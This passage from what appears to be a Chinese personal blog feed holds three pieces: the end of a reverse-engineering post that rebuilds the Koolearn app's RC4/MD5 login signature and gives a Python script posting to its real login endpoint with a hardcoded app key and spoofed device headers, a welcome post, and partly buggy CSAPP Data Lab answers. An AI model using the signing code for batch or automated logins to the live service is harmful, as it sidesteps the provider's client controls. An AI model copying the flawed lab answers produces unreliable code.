class="hljs-number">0x41</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0xDB</span>,<br><span class="hljs-number">0x2C</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x7F</span>,<br><span class="hljs-number">0xC5</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0xA3</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0x94</span>,<br><span class="hljs-number">0x97</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0xA6</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0xA9</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0xDF</span>,<br><span class="hljs-number">0xF2</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0x31</span>,<br><span class="hljs-number">0x86</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0xFC</span>,<br><span class="hljs-number">0xA0</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0xBC</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x66</span>,<br><span class="hljs-number">0xC6</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0x44</span>,<br><span class="hljs-number">0x98</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0xA5</span>,<br><span class="hljs-number">0xF1</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0xA2</span>,<br><span class="hljs-number">0x80</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0xA7</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0x71</span>,<br><span class="hljs-number">0x1E</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x12</span>,<br><span class="hljs-number">0xF7</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0xB3</span>,<br><span class="hljs-number">0xAF</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0xC7</span>,<br><span class="hljs-number">0xD0</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x48</span>,<br><span class="hljs-number">0x85</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0xD3</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x5B</span>,<br><span class="hljs-number">0x00</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0xE2</span>,<br><span class="hljs-number">0x42</span>, <span class="hljs-number">0xAE</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>,<br><span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>]<span class="hljs-comment">#直接获取对应的box为接下来的RC4进行异或加密</span><br>output = [<span class="hljs-number">0</span>] * xlen<br>v4 = <span class="hljs-number">0</span><br>v5 = box[<span class="hljs-number">256</span>]<br>i = box[<span class="hljs-number">260</span>]<br><span class="hljs-keyword">for</span> v4 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(xlen):<br>v7 = v4<br>v8 = v4 + <span class="hljs-number">1</span><br>v9 = box[v8]<br>v10 = box[i]<br>box[i] = v9<br>box[v8] = v10<br>v11 = (v9 +v10)%<span class="hljs-number">256</span><br><span class="hljs-keyword">if</span>(sign[v4] != <span class="hljs-number">0</span>):<br>v12 = sign[v4]<br>v13 = box[v11] ^ v12<br><span class="hljs-keyword">if</span>(sign[v4] == <span class="hljs-number">0</span>):<br>v13 = box[v11]<br>output[v4] = v13<br>v4 += <span class="hljs-number">1</span><br>i = (i + box[v7 + v5 +<span class="hljs-number">1</span>]) %<span class="hljs-number">256</span><br>changed = <span class="hljs-built_in">bytes</span>(output)<br>h1 = hashlib.md5()<span class="hljs-comment">#MD5加密</span><br>h1.update(changed)<br><span class="hljs-keyword">return</span>(h1.hexdigest())<br></code></pre></td></tr></table></figure><h3 id="请求登录："><strong>请求登录</strong>：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">login</span>():</span><br><span class="hljs-comment">#print(&quot;输入账号 :&quot;)</span><br>uid = <span class="hljs-string">&#x27;&#x27;</span><span class="hljs-comment">#填入账号</span><br><span class="hljs-comment">#print(&quot;输入密码 :&quot;)</span><br>password = <span class="hljs-string">&#x27;&#x27;</span><span class="hljs-comment">#填入密码</span><br><span class="hljs-comment">#批量登录可以将uid和password封装到一个字典？</span><br>a = <span class="hljs-string">&quot;app_id,7appsign,d3b1b961f3d090fd0e4b0026662420afpassword,&quot;</span><br>a = a + password<br>b = [<span class="hljs-number">0</span>] * <span class="hljs-built_in">len</span>(a)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>b[i] = <span class="hljs-built_in">ord</span>(a[i])<br>b.append(<span class="hljs-number">10</span>)<br>usersName= <span class="hljs-string">&quot;userName,&quot;</span><br>usersName = <span class="hljs-string">&quot;userName,&quot;</span> + uid<br>d = [<span class="hljs-number">0</span>] * <span class="hljs-built_in">len</span>(usersName)<br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(usersName)):<br>d[j] = <span class="hljs-built_in">ord</span>(usersName[j])<br>xlen = <span class="hljs-built_in">len</span>(a) + <span class="hljs-built_in">len</span>(usersName) + <span class="hljs-number">1</span><br>sign = b + d<br>url = <span class="hljs-string">&quot;https://mobi.koolearn.com/ci/login&quot;</span><br>headers = &#123;<span class="hljs-string">&quot;Content-Type&quot;</span>:<span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>,<span class="hljs-string">&quot;imei&quot;</span>:<br><span class="hljs-string">&quot;b37e74424d6a28a6&quot;</span>,<span class="hljs-string">&quot;Content-Length&quot;</span>:<span class="hljs-string">&quot;110&quot;</span>,<span class="hljs-string">&quot;pversion&quot;</span>: <span class="hljs-string">&quot;1.1&quot;</span>,<span class="hljs-string">&quot;Host&quot;</span>:<br><span class="hljs-string">&quot;mobi.koolearn.com&quot;</span>,<span class="hljs-string">&quot;Connection&quot;</span>: <span class="hljs-string">&quot;Keep-Alive&quot;</span>,<span class="hljs-string">&quot;Accept-Encoding&quot;</span>:<br><span class="hljs-string">&quot;gzip&quot;</span>,<span class="hljs-string">&quot;appname&quot;</span>: <span class="hljs-string">&quot;koolearn&quot;</span>,<span class="hljs-string">&quot;vendor&quot;</span>: <span class="hljs-string">&quot;koolearn&quot;</span>,<span class="hljs-string">&quot;channel&quot;</span>:<br><span class="hljs-string">&quot;guanfang&quot;</span>,<span class="hljs-string">&quot;version&quot;</span>: <span class="hljs-string">&quot;5.3.1&quot;</span>,<span class="hljs-string">&quot;vcode&quot;</span>: <span class="hljs-string">&quot;531&quot;</span>,<span class="hljs-string">&quot;macaddr&quot;</span>:<br><span class="hljs-string">&quot;02:00:00:00:00:00&quot;</span>,<span class="hljs-string">&quot;model&quot;</span>: <span class="hljs-string">&quot;OPPO,PEHM00&quot;</span>,<span class="hljs-string">&quot;screensize&quot;</span>: <span class="hljs-string">&quot;1080*2290&quot;</span>,<span class="hljs-string">&quot;UserAgent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Linux; Android 11; PEHM00 Build/RKQ1.201217.002; wv)AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 MobileSafari/537.36&quot;</span>,<span class="hljs-string">&quot;model&quot;</span>: <span class="hljs-string">&quot;OPPO,PEHM00&quot;</span>,<span class="hljs-string">&quot;platform&quot;</span>: <span class="hljs-string">&quot;android_phone_11&quot;</span>&#125;<span class="hljs-comment">#请求头</span><br>slen = <span class="hljs-built_in">len</span>(pw)<br>data = <span class="hljs-string">&quot;password=&quot;</span><br>password = <span class="hljs-built_in">list</span>(password)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(slen):<br><span class="hljs-keyword">if</span>(password[i]==<span class="hljs-string">&#x27;=&#x27;</span>):<br>password[i] = <span class="hljs-string">&#x27;%3D&#x27;</span><br>password = <span class="hljs-string">&#x27;&#x27;</span>.join(password)<br>data = data + password + <span class="hljs-string">&#x27;%0A&#x27;</span><br>data = data +<span class="hljs-string">&quot;&amp;userName=&quot;</span> + uid<br>data = data +<span class="hljs-string">&quot;&amp;app_id=7&amp;validation=&quot;</span> + generateSign(sign,xlen)<span class="hljs-comment">#请求信息</span><br>res = requests.post(url=url,data=data,headers=headers, verify=<span class="hljs-literal">True</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;登录成功 ：&quot;</span>)<br><span class="hljs-built_in">print</span>(res.text)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27; &#x27;</span>)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Reverse Practice</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>摸鱼人！</title>
    <link href="/2022/03/14/hello-world/"/>
    <url>/2022/03/14/hello-world/</url>
    
    <content type="html"><![CDATA[<h2 id="欢迎来到此博客">欢迎来到此博客</h2><p>系究极摸鱼人捏 ~</p><p>本博客上可能会更新各种各样的奇奇怪怪的东西，主要是纪录一些个人的学习和一些感悟 ~</p><p>可能更新频率不高，但是我会继续更新的 ~</p><p>顺带提一下<code>[持续更新]</code>的文章更新可能会被咕咕很久 ~</p><p>可以多多关注一下 ~</p><p>本博客也开通了留言功能，虽然不一定能够及时看到，但是希望大家能够多多交流，互相学习呀 ~</p>]]></content>
    
    
    <categories>
      
      <category>Others</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP - Data Lab</title>
    <link href="/2022/03/14/Data%20Lab/"/>
    <url>/2022/03/14/Data%20Lab/</url>
    
    <content type="html"><![CDATA[<h1>Data Lab</h1><h2 id="前言">前言</h2><p>看到网上对这个实验讲解的不是很详细，个人将其中的一些部分进行了细化方便大家理解与学习，如有不对处还请多多指正。</p><h2 id="第一题">第一题</h2><p>用<code>&amp;</code>和<code>~</code>在 14 个字符以内实现异或</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * bitXor - x^y using only ~ and &amp; </span><br><span class="hljs-comment"> *   Example: bitXor(4, 5) = 1</span><br><span class="hljs-comment"> *   Legal ops: ~ &amp;</span><br><span class="hljs-comment"> *   Max ops: 14</span><br><span class="hljs-comment"> *   Rating: 1</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">bitXor</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> y)</span> </span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>求解方式有如下 3 种方式：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">a^b=<br>= (a|b)&amp;(~a|~b)<br>= ~(~a&amp;~b)&amp;~(a&amp;b)<br>= (a&amp;~b)|(~a&amp;b)<br></code></pre></td></tr></table></figure><p>可以用这三种方式表示异或操作，具体的推导可以自行Google。答案如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">return</span> ~(~a&amp;~b)&amp;~(a&amp;b);<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/03/13/BHZ16iuoNpKgkO4.png" alt=""></p><h2 id="第二题">第二题</h2><p>题目要求返回最小二进制补码整数，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * tmin - return minimum two&#x27;s complement integer </span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 4</span><br><span class="hljs-comment"> *   Rating: 1</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">tmin</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>我们已知最小的二进制补码数是<code>-2147483648</code>其对应的二进制位是<code>1000000...</code>，所以我们直接将 1 进行左移即可得到。答案如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">31</span>;<br></code></pre></td></tr></table></figure><h2 id="第三题">第三题</h2><p>题目要求如果是补码的最大数返回 1 ，否则返回 0</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * isTmax - returns 1 if x is the maximum, two&#x27;s complement number,</span><br><span class="hljs-comment"> *     and 0 otherwise </span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | +</span><br><span class="hljs-comment"> *   Max ops: 10</span><br><span class="hljs-comment"> *   Rating: 1</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">isTmax</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们知道<code>011111.....</code>表示的是补码的最大二进制位，如果我们对其加 1 可以得到<code>10000000....</code>再取一次反便可以得到原来的最大补码。同时由于一个数异或本身为 0 ，我们便可以利用个性质来代替等号的判断，于是我们有对应的如下思路：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">~ ( a + <span class="hljs-number">1</span> ) ^ a == <span class="hljs-number">0</span> ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>题目中并没有允许<code>?:</code>的使用，于是我们可以换一种方式来实现这个过程：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">return</span> ! ( ~ ( a + <span class="hljs-number">1</span> ) ^ a );<br></code></pre></td></tr></table></figure><p>上述的结果并不完全正确，如果我们输入的数字是<code>1111111...</code>那么再经过上述操作过后，会再次变回该数字，因此我们要判断这个特例</p><blockquote><p>1111… + 1 = 0000…<br>~ 0000… = 1111…</p></blockquote><p>我们这里引入一个概念规格化数据：<code>!! x</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//我们对一个数进行两次取反，如果一个数是不为 0 的数，两次取反后返回值是 1 ，如果该数是 0 ，则返回的仍为 0</span><br>!! <span class="hljs-number">123</span> = <span class="hljs-number">1</span><br>!! <span class="hljs-number">-1</span> = <span class="hljs-number">1</span><br>!! <span class="hljs-number">0</span> = <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>同时我们利用<code>&amp;</code>运算符的特性，一个数与 0 进行与运算的结果都是 0 ，来判断特殊数据<code>1111...</code>，我们构造如下式子来进行判断特殊数据：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">!! (( x + <span class="hljs-number">1</span> ) ^ <span class="hljs-number">0x0</span> )<br></code></pre></td></tr></table></figure><p>如果输入值是<code>1111...</code>那么其值是 0 ，其他情况下返回值为 1</p><p>于是我们可以写出对应解：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">return</span> ! ( ~ ( a + <span class="hljs-number">1</span> ) ^ a ) &amp; !! (( x + <span class="hljs-number">1</span> ) ^ <span class="hljs-number">0x0</span> );<br></code></pre></td></tr></table></figure><h2 id="第四题">第四题</h2><p>题目要求判断所有二进制偶数位是否都为 1 ，如果是返回 1 否则返回 0</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * allOddBits - return 1 if all odd-numbered bits in word set to 1</span><br><span class="hljs-comment"> *   where bits are numbered from 0 (least significant) to 31 (most significant)</span><br><span class="hljs-comment"> *   Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 12</span><br><span class="hljs-comment"> *   Rating: 2</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">allOddBits</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>我们从题目中了解到最大长度的二进制位长 32 ，我们注意到：一个特殊的数据<code>101010....</code>与一个数进行<code>&amp;</code>运算得到的结果如果与<code>101010....</code>本身异或等于 0 时则证明了该数的二进制偶数位上全是 1 。</p><p>对此我们需要<code>101010....</code>来帮助我们进行判断，但是题目中不允许我们直接定义，于是我们将<code>A ( 1010 ) </code>进行变换得到<code>0xAAAAAAAA</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">int</span> A = <span class="hljs-number">0xA</span><span class="hljs-comment">//4</span><br><span class="hljs-keyword">int</span> AA = A | A &lt;&lt; <span class="hljs-number">4</span><span class="hljs-comment">//8</span><br><span class="hljs-keyword">int</span> AAA = AA | AA &lt;&lt; <span class="hljs-number">8</span><span class="hljs-comment">//16</span><br><span class="hljs-keyword">int</span> AAAA = AAA | AAA &lt;&lt; <span class="hljs-number">16</span><span class="hljs-comment">//32</span><br></code></pre></td></tr></table></figure><p>通过上述方式我们构造出来了<code>0xAAAAAAAA</code>，于是我们可以进行相应的运算了，答案如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">int</span> A = <span class="hljs-number">0xA</span><span class="hljs-comment">//4</span><br><span class="hljs-keyword">int</span> AA = A | A &lt;&lt; <span class="hljs-number">4</span><span class="hljs-comment">//8</span><br><span class="hljs-keyword">int</span> AAA = AA | AA &lt;&lt; <span class="hljs-number">8</span><span class="hljs-comment">//16</span><br><span class="hljs-keyword">int</span> AAAA = AAA | AAA &lt;&lt; <span class="hljs-number">16</span><span class="hljs-comment">//32</span><br><span class="hljs-keyword">return</span> !((AAAA&amp;x) ^ AAAA)<br></code></pre></td></tr></table></figure><h2 id="第五题">第五题</h2><p>题目要求返回输入数据的负数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * negate - return -x </span><br><span class="hljs-comment"> *   Example: negate(1) = -1.</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 5</span><br><span class="hljs-comment"> *   Rating: 2</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">negate</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>一个数<code>x</code>，<code>-x</code>为其补码，所以我们对<code>x</code>取反码后加一，得到的便是其所对应的负数</p><blockquote><p><code>A + ~A = -1</code> 和 <code>A + neg A =0</code> 利用这两个式子我们可以得到 <code>neg A = ~A + 1</code></p></blockquote><p>所以答案为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">return</span> ~ x + <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h2 id="第六题">第六题</h2><p>题目要求如果输入的<code>ASCII</code>在字符<code>0 - 9</code>之间就返回 1 否则返回 0</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * isAsciiDigit - return 1 if 0x30 &lt;= x &lt;= 0x39 (ASCII codes for characters &#x27;0&#x27; to &#x27;9&#x27;)</span><br><span class="hljs-comment"> *   Example: isAsciiDigit(0x35) = 1.</span><br><span class="hljs-comment"> *            isAsciiDigit(0x3a) = 0.</span><br><span class="hljs-comment"> *            isAsciiDigit(0x05) = 0.</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 15</span><br><span class="hljs-comment"> *   Rating: 3</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">isAsciiDigit</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br>  <span 